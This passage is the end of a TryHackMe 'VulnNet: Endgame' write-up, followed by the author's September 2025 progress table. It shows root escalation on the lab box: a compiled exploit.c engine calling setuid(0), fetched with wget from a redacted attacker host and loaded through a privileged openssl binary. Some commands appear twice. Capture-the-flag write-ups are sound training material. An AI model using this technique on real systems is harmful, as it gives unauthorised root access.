exploit.c:4:5: warning: implicit declaration of function \u2018setuid\u2019 [-Wimplicit-function-declaration]
    4 |     setuid(0); setgid(0);
      |     ^~~~~~
exploit.c:4:16: warning: implicit declaration of function \u2018setgid\u2019 [-Wimplicit-function-declaration]
    4 |     setuid(0); setgid(0);
      |                ^~~~~~
```

```bash
:~/Desktop# gcc -shared -o exploit.so -lcrypto exploit.o
```

<h2>exploit</h2>

```bash
system@vulnnet-endgame:/tmp$ wget http://xx.xxx.xx.xx:8000/exploit.so
```

```bash
system@vulnnet-endgame:/tmp$ chmod +x exploit.so
```

```bash
system@vulnnet-endgame:/tmp$ /home/system/Utils/openssl req -engine ./exploit.so
```

```bash
system@vulnnet-endgame:/tmp$ wget http://xx.xxx.xx.xx:8000/exploit.so
```

```bash
system@vulnnet-endgame:/tmp$ chmod +x exploit.so
```

```bash
system@vulnnet-endgame:/tmp$ /home/system/Utils/openssl req -engine ./exploit.so
```

```bash
root@vulnnet-endgame:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(system)
```

```bash
root@vulnnet-endgame:/tmp# cd /root
```

```bash
root@vulnnet-endgame:/root# ls
snap  thm-flag
```

```bash
root@vulnnet-endgame:/root# cd thm-flag
```

```bash
root@vulnnet-endgame:/root/thm-flag# ls
root.txt
```

```bash
root@vulnnet-endgame:/root/thm-flag# cat root.txt
THM{********************************}
```

<br>
<p>1.3. What is the root flag?<br>
<code>THM{********************************}</code></p>

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/fb6edcf8-d401-41c2-9eaf-99993e873297"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0f72f92c-ae1d-4d7c-8647-21d744493668"></p>


<h2 align="center">My TryHackMe Journey ・ 2025, September</h2>

<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time<br>Global   |   All Time<br>Brazil   |   Monthly<br>Global   |   Monthly<br>Brazil  | Points   | Rooms<br>Completed     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
| 2025, Sep 14      |Hard 🚩 - <code><strong>VulnNet: Endgame</strong></code>| 496  | 108ᵗʰ | 5ᵗʰ  |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
| 2025, Sep 13      |Hard 🚩 - Royal Router| 495  | 107ᵗʰ | 5ᵗʰ  |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
| 2025, Sep 13      |Medium 🚩 - Void Execution             | 495  | 107ᵗʰ | 5ᵗʰ  |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
| 2025, Sep 12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
| 2025, Sep 12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
| 2025, Sep 11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
| 2025, Sep 10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
| 2025, Sep 9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
| 2025, Sep 9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	    5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |   940    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
</h6></div><br>

<br>

<p align="center">Global All Time:   108ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/81862bfb-3b90-4081-9ff5-19b2d4e2d857"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/ee9f4b93-82ae-444b-8605-c580aa62999d"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/25a79410-b98a-437a-83a3-c53453db9975"><br>
                  Global monthly:   394ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7178700e-897b-45bf-9105-a66c36f398f8"><br>
                  Brazil monthly:      6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c9ce3a58-b117-4b94-931d-422f4cf31d9c"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
